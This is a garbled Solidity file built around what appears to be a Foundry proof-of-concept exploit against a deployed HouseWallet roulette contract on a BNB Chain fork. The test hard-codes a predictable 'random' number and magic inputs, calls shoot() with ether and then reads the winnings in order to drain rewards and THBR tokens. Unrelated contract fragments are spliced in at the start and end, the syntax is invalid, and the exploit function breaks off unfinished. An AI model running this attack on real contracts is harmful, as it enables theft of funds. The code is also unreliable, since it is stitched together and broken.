
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity ^0.8.10;

;
;
interface IERC721Receiver {
    function onERC721Received(address operator,
        address from,
        uint256 tokenId,
        bytes calldata data) external returns (bytes4)};
interface HouseWallet{
    function winners(uint256 id, address player) view external returns(uint256);
    function claimReward(uint256 _ID,
        address payable _player,
        uint256 _amount,
        bool _rewardStatus,
        uint256 _x,
        string memory name,
        address _add) external;
    function shoot(uint256 random,
        uint256 gameId,
        bool feestate,
        uint256 _x,
        string memory name,
        address _add,
        bool nftcheck,
        bool dystopianCheck) external payable};
contract ContractTest is DSTest{
    HouseWallet houseWallet = HouseWallet(0xae191Ca19F0f8E21d754c6CAb99107eD62B6fe53);
    uint256 randomNumber =  12345678000000000000000000;
    uint256 gameId = 1;
    bool feestate = false;
    uint256 _x = 2845798969920214568462001258446;
    string  name = "HATEFUCKINGHACKERSTHEYNEVERCANHACKTHISIHATEPREVIOUS";
    address _add = 0x6Ee709bf229c7C2303128e88225128784c801ce1;
    bool nftcheck = true;
    bool dystopianCheck = true;
    address payable add = payable(address(this));
    bool _rewardStatus = true;
    uint256 _x1 = 969820990102090205468486;
    string name1 = "WELCOMETOTHUNDERBRAWLROULETTENOWYOUWINTHESHOOTINGGAME";
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC721 THBR = IERC721(0x72e901F1bb2BfA2339326DfB90c5cEc911e2ba3C);
    function setUp() public {
        cheats.createSelectFork("bsc", 21785004)};
    function testExploit() public{
        emit log_named_uint("Attacker THBR balance before exploit",
            THBR.balanceOf(address(this)));
        houseWallet.shoot{value: 0.32 ether}(randomNumber, gameId, feestate, _x, name, _add, nftcheck, dystopianCheck);
        uint256 _amount = houseWallet.winners(gameId, add);
function publicQuery() public view returns (bytes memory) {
    return internalEncryptedStorage[msg.sender];}